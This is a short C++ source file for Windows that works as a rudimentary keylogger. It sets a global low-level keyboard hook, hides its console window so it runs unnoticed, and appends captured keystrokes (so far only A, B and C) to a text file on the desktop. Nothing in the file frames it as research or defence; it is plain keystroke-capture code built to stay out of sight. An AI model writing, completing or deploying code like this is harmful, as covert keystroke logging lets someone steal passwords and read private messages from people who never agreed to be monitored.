#include <Windows.h>
#include <string>

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int textWriteToFile(std::string letter) {
    HANDLE hFile = CreateFile(
        L"C:\\Users\\user\\Desktop\\AAAA.txt",    // Filename
        FILE_APPEND_DATA,          // Desired access
        FILE_SHARE_READ,        // Share mode
        NULL,                   // Security attributes
        OPEN_ALWAYS,             // Creates a new file, only if it doesn't already exist
        FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
        NULL);                  // Template file handle

    if (hFile == INVALID_HANDLE_VALUE) {
        return 2;
    }

    DWORD bytesWritten;
    WriteFile(
        hFile,            // Handle to the file
        letter.c_str(),  // Buffer to write
        letter.size(),   // Buffer size
        &bytesWritten,    // Bytes written
        nullptr);         // Overlapped

    CloseHandle(hFile);
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            if (kbdStruct.vkCode == VK_F1) {
                MessageBoxA(NULL, "F1 is pressed!", "key pressed", MB_ICONINFORMATION);
            }
            if (kbdStruct.vkCode == 0x41) {
                //MessageBoxA(NULL, "A is pressed!", "key pressed", MB_ICONINFORMATION);
                textWriteToFile("A");
            }
            if (kbdStruct.vkCode == 0x42) {
                textWriteToFile("B");
            }
            if (kbdStruct.vkCode == 0x43) {
                textWriteToFile("C");
            }
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        MessageBoxA(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void ReleaseHook() {
    UnhookWindowsHookEx(_hook);
}

void main() {
    SetHook();

    MSG msg;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (GetMessage(&msg, NULL, 0, 0)) {

    }
}